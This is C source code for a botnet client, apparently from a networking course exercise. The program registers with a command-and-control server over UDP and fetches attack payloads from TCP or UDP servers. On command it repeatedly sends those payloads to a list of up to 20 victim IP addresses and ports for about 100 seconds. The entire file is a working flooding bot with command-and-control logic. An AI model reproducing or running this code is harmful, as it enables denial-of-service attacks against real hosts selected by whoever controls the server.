#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <err.h>
#include <errno.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/select.h>

#include "net_functions.h"


typedef struct victim {
	char ip[INET_ADDRSTRLEN];
	char port[22];
} victim;

typedef struct MSG {
	char command;
	victim victims[20];
} MSG;


void printHelp() {
	printf("\nHelp:\n");
	printf("bot server_ip server_port\n(this program uses port 1212)\n\n");
	return;
}






int main(int argc, char *argv[]) {
	/*
	 * exit code 1 => wrong input option(s)
	 * exit code 2 => net proble - socket
	 * exit code 3 => net proble - bind
	 * */
	char debug = (char)(1);		/* change if you want to debug */
	
	struct MSG commands;
	
	char *payload[25];
	int payloadSize = 0;
	
	int portIn;
	char *portInCh;
	char *ipIn;
	char reg[10] = "REG\n";
	char hello[10] = "HELLO\n";
	int i, j, k, canAttack = 0, err123 = 0, onFlag = 1;
	char tmpIpString[75];
	
	/* UDP */
	int sockUDP;
	struct addrinfo addrUDPHints, *addrUDPRes;
	struct addrinfo ccServHints, *ccServRes;
	struct sockaddr_in *ccServ;
	struct sockaddr_in UDP_server;
	struct sockaddr_in victim123;
	int msglen;
	char buff[512];
	socklen_t ccServlen;
	socklen_t udpServlen;
	socklen_t victimlen;
	
	/* victims */
	struct addrinfo victimHints, *victimRes;
	
	/* TCP */
	int sockTCP, newSock;
	struct addrinfo hints, *res;
	struct sockaddr *cliTCP;
	socklen_t *clilenTCP;
	ssize_t recvLen;
	
	/* select */
	fd_set currentSet, readySet;
	struct timeval tv;
	
	
	
	
	/* set values for select */
	FD_ZERO(&currentSet);
	tv.tv_sec = 1;
	tv.tv_usec = 10000;
	
	
	if(debug)
		printTerminalOptions(argc, argv);
	
	if(argc != 3) {
		printHelp();
		err(1, "\n\nWrong input option(s) (exit code 1)\n");
	}
	
	portIn = atoi( argv[argc-1] );
	portInCh = argv[argc-1];
	ipIn = (char *) malloc(512*sizeof(char));
	ipIn[0] = (char) (0);
	ipIn = argv[argc-2];
	
	if(debug) {
		printf("\nportIn = %d, ipIn = %s\n", portIn, ipIn);
	}
	
	// set local data
	memset(&addrUDPHints, 0, sizeof(addrUDPHints));
	addrUDPHints.ai_family = AF_INET;
	addrUDPHints.ai_socktype = SOCK_DGRAM;
	addrUDPHints.ai_flags = AI_PASSIVE;
	
	getaddrinfo(NULL, "1212", &addrUDPHints, &addrUDPRes);
	if(err123) {
		errx(10, "\n\n getaddrinfo: %s\n", gai_strerror(err123));
	}
	
	sockUDP = Socket(addrUDPRes->ai_family, addrUDPRes->ai_socktype, addrUDPRes->ai_protocol);
	if( setsockopt(sockUDP, SOL_SOCKET, SO_BROADCAST, &onFlag, sizeof(int)) == -1 ) {
		err(27, "\n\nNet problem - setsockopt SO_BROADCAST (exit code 27)\n");
	}
	if( setsockopt(sockUDP, SOL_SOCKET, SO_REUSEADDR, &onFlag, sizeof(int)) == -1 ) {
		err(28, "\n\nNet problem - setsockopt SO_REUSEADDR (exit code 28)\n");
	}
	
	Bind(sockUDP, addrUDPRes->ai_addr, addrUDPRes->ai_addrlen);
	
	
	// set C&C server data
	memset(&ccServHints, 0, sizeof(ccServHints));
	ccServHints.ai_family = AF_INET;
	ccServHints.ai_socktype = SOCK_DGRAM;
	ccServHints.ai_flags = AI_PASSIVE;
	
	err123 = getaddrinfo(ipIn, portInCh, &ccServHints, &ccServRes);
	if(err123) {
		errx(10, "\n\n getaddrinfo: %s\n", gai_strerror(err123));
	}
	
	
	memset(&ccServ, 0, sizeof ccServ);
	ccServ = ((struct sockaddr_in *) (ccServRes->ai_addr));
	
	
	/* add sockUDP to currentSet */
	FD_SET(sockUDP, &currentSet);
	
	
	
	// work
	ccServlen = sizeof(ccServ);
	sendto(sockUDP, reg, strlen(reg), 0,
			(struct sockaddr *) ccServ,
			sizeof(*ccServ));

	bigJumpBeforeWhile:
	while(1) {
		readySet = currentSet;
		
		memset(&commands, 0, sizeof(commands) );
		
		if(debug)
			printf("\n\nWait for C&C\n");
		
		msglen = recvfrom(sockUDP, (struct MSG *) &commands, 512, 0, (struct sockaddr*) ccServ, &ccServlen);
		
		if(debug)
			printf("Command: %d\n", commands.command);
		
		
		if(commands.command == '1') {				/* prog TCP */
			if(debug)
				printf("Connecting to TCP server\n");
			
			memset(&hints, 0, sizeof(hints));
			hints.ai_family = AF_INET;
			hints.ai_socktype = SOCK_STREAM;
			hints.ai_protocol = IPPROTO_TCP;
			//hints.ai_flags |= AI_PASSIVE;
			hints.ai_flags |= AI_CANONNAME;
			
			err123 = getaddrinfo(NULL, "7070", &hints, &res);
			if(err123) {
				errx(20, "\n\n getaddrinfo: %s\n", gai_strerror(err123));
			}
			
			sockTCP = Socket(res->ai_family, res->ai_socktype, res->ai_protocol);
			if( setsockopt(sockTCP, SOL_SOCKET, SO_REUSEADDR, &onFlag, sizeof(int)) == -1 ) {
				err(21, "\n\nNet problem - setsockopt (exit code 22)\n");
			}
			//Bind(sockTCP, res->ai_addr, res->ai_addrlen);
			
			
			err123 = getaddrinfo(commands.victims[0].ip, commands.victims[0].port, &hints, &res);
			if(err123) {
				errx(20, "\n\n getaddrinfo (TCP prije connect): %s\n", gai_strerror(err123));
			}
			
			if(debug) {
				printf("\nPrije connect\n");
				printf("\nSpojio sam se na TCP server %s %s\n", commands.victims[0].ip, commands.victims[0].port);
			}
			
			Connect(sockTCP, res->ai_addr, res->ai_addrlen);
			
			if(debug) {
				printf("\nSpojio sam se na TCP server %s %s\n", commands.victims[0].ip, commands.victims[0].port);
			}
			
			
			err123 = send(sockTCP, hello, strlen(hello), 0);
			if(err123 < 0) {
				err(101, "\n\nNet problem - send (exit code 101)\n");
			}
			if(debug) {
				printf("\nMessage sent to server\n");
			}
			
			recvLen = recv(sockTCP, buff, 512, 0);
			
			close(sockTCP);
			
			
			
			j = 0;	/* redni broj payloada */
			k = 0;	/* brojac za pojedini payload */
			payload[j] = malloc( 25*sizeof(char) );
			for(i = 0; i<msglen; i++) {
				
				if( *(buff + i) == '\n' ) {
					continue;
					
				} else if( *(buff + i) == (char) 0 ) {
					break;
					
				} else if( *(buff + i) == ':' ) {
					*(payload[j] + k) = '\n';
					*(payload[j] + k + 1) = (char) 0;
					
					k = 0;
					j++;
					payload[j] = malloc( 25*sizeof(char) );
					
				} else {
					*(payload[j] + k) = *(buff+i);
					k++;
				}
				
			}
			
			
			canAttack = 1;
			payloadSize = j;
			
			if(debug)
				for(i = 0; i<payloadSize; i++) {
					printf("payload[ i = %d ] = %s", i, payload[i]);
				}
			
			
			
			
		} else if(commands.command == '2') {		/* prog UDP */
			if(debug)
				printf("\nSpajam sam se na UDP server %s %s\n", commands.victims[0].ip, commands.victims[0].port);
			
			/*memset(&UDP_server, 0, sizeof(UDP_server) );
			inet_pton(AF_INET, commands.victims[0].ip, &(UDP_server.sin_addr));
			UDP_server.sin_port = htons( atoi( commands.victims[0].port ) );
			UDP_server.sin_family = AF_INET;*/
			
			memset(&hints, 0, sizeof(hints));
			hints.ai_family = AF_INET;
			hints.ai_socktype = SOCK_DGRAM;
			hints.ai_protocol = IPPROTO_UDP;
			
			err123 = getaddrinfo(commands.victims[0].ip, commands.victims[0].port, &hints, &res);
			if(err123) {
				errx(20, "\n\n getaddrinfo (TCP prije connect): %s\n", gai_strerror(err123));
			}
			
			/*udpServlen = sizeof(UDP_server);*/
			sendto(sockUDP, hello, strlen(hello)+1, 0,  res->ai_addr, res->ai_addrlen);
			
			msglen = recvfrom(sockUDP, buff, 512, 0, res->ai_addr, &(res->ai_addrlen));
			
			j = 0;	/* redni broj payloada */
			k = 0;	/* brojac za pojedini payload */
			payload[j] = malloc( 25*sizeof(char) );
			for(i = 0; i<msglen; i++) {
				
				if( *(buff + i) == '\n' ) {
					continue;
					
				} else if( *(buff + i) == (char) 0 ) {
					break;
					
				} else if( *(buff + i) == ':' ) {
					*(payload[j] + k) = '\n';
					*(payload[j] + k + 1) = (char) 0;
					
					k = 0;
					j++;
					payload[j] = malloc( 25*sizeof(char) );
					
					
					
				} else {
					*(payload[j] + k) = *(buff+i);
					k++;
				}
				
			}
			
			
			canAttack = 1;
			payloadSize = j;
			
			if(debug)
				for(i = 0; i<payloadSize; i++) {
					printf("payload[ i = %d ] = %s", i, payload[i]);
				}
			
		} else if( (commands.command == '3') && (canAttack == 1) ) {		/* run attack */
			if(debug)
				printf("\nAttack victims:\n");
			
			for(j=0; j<100; j++) {											/* 100 seconds */
				
				for(i = 0; i<20; i++) {										/* cicle victims */
					if(strlen(commands.victims[i].ip) > 1) {
						
						if(debug)
							printf("\nTest 123\n");
						
						/*memset(&victim123, 0, sizeof(victim123) );
						inet_pton(AF_INET, commands.victims[i].ip, &(victim123.sin_addr));
						victim123.sin_port = htons( atoi( commands.victims[i].port ) );
						victim123.sin_family = AF_INET;*/
						
						memset(&victimHints, 0, sizeof(victimHints));
						victimHints.ai_family = AF_INET;
						victimHints.ai_socktype = SOCK_DGRAM;
						victimHints.ai_flags = AI_PASSIVE;
						err123 = getaddrinfo(commands.victims[i].ip, commands.victims[i].port, &victimHints, &victimRes);
						if(err123) {
							errx(20, "\n\n getaddrinfo (TCP prije connect): %s\n", gai_strerror(err123));
						}
						
						if(debug)
							printf("Attack: %s, %s, payload: %s\n", 
								commands.victims[i].ip, commands.victims[i].port, payload[0]);
						
						victimlen = sizeof(victim123);
						for(k = 0; k<payloadSize; k++) {
							if(debug)
							printf("Attack: %s, %s, payload: %s\n", 
								commands.victims[i].ip, commands.victims[i].port, payload[k]);
							
							sendto(sockUDP, payload[k], strlen(payload[k]), 0,  victimRes->ai_addr, victimRes->ai_addrlen);
							//sendto(sockUDP, payload[k], strlen(payload[k]), 0,  (struct sockaddr*)&victim123, victimlen);
							
						}
						
					} else {
						continue;
					}
				}
				
				if(debug && j<99)					/* 100 seconds */
					printf("\n==========\n");
				
				
				readySet = currentSet;
				if( select(FD_SETSIZE, &readySet, NULL, NULL, &tv) < 0 ) {
					printf("\nselect problem\n");
				}
				if( FD_ISSET(sockUDP, &readySet) ) {
					msglen = recvfrom(sockUDP, (struct MSG *) &commands, 512, 0,
													(struct sockaddr*) ccServ, &ccServlen);
					
					inet_ntop(AF_INET, &(ccServ->sin_addr), tmpIpString, 75);
					
					if(debug) {
						printf("\nPoruka sa %s %d\n",
							tmpIpString, htons(ccServ->sin_port));
					}
					
					goto bigJumpBeforeWhile;
					
				} else {
					if(debug)
						printf("\ntime out\n");
				}
				
				
				//sleep(1);
			}
			
		} else if(commands.command == '0') {
			if(debug)
				printf("\nTerminated\n");
			close(sockUDP);
			return 0;
		} else {
			if(debug)
				printf("\nUnknown command\n");
		}
	}
	
	return 0;
}































